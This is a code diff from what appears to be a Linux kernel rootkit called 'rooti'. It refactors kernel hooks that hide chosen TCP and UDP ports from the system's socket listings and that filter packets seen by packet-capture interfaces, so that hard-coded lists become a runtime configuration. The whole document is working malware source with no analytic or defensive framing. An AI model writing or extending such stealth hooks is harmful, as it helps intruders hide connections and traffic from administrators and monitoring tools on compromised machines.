@@ -150,8 +150,8 @@ static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
     if (socket == SEQ_START_TOKEN)
         return orig_tcp4_seq_show(seq, v);
 
-    for (int i = 0; i < ROOTI_HIDDEN_TCP_PORTS_COUNT; i++) {
-        if (ROOTI_HIDDEN_TCP_PORTS[i] == socket->sk_num) {
+    for (int i = 0; i < rooti_config.hidden_tcp_ports.len; i++) {
+        if (rooti_config.hidden_tcp_ports.ptr[i] == socket->sk_num) {
             return 0;
         }
     }
@@ -166,8 +166,8 @@ static int hook_udp4_seq_show(struct seq_file *seq, void *v)
     if (socket == SEQ_START_TOKEN)
        return orig_udp4_seq_show(seq, v);
 
-    for (int i = 0; i < ROOTI_HIDDEN_UDP_PORTS_COUNT; i++) {
-        if (ROOTI_HIDDEN_UDP_PORTS[i] == socket->sk_num) {
+    for (int i = 0; i < rooti_config.hidden_udp_ports.len; i++) {
+        if (rooti_config.hidden_udp_ports.ptr[i] == socket->sk_num) {
             return 0;
         }
     }
@@ -181,7 +181,7 @@ static int hook_packet_rcv(struct sk_buff *skb, struct net_device *dev,
                            struct packet_type *pt, struct net_device *orig_dev)
 {
     enum rooti_net_rule_action action;
-    rooti_match_packet(skb, &ROOTI_PCAP_POLICY, &action);
+    rooti_match_packet(skb, &rooti_config.pcap_policy, &action);
 
     switch (action)
     {
@@ -199,7 +199,7 @@ static int hook_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
                            struct packet_type *pt, struct net_device *orig_dev)
 {
     enum rooti_net_rule_action action;
-    rooti_match_packet(skb, &ROOTI_PCAP_POLICY, &action);
+    rooti_match_packet(skb, &rooti_config.pcap_policy, &action);
 
     switch (action)
     {
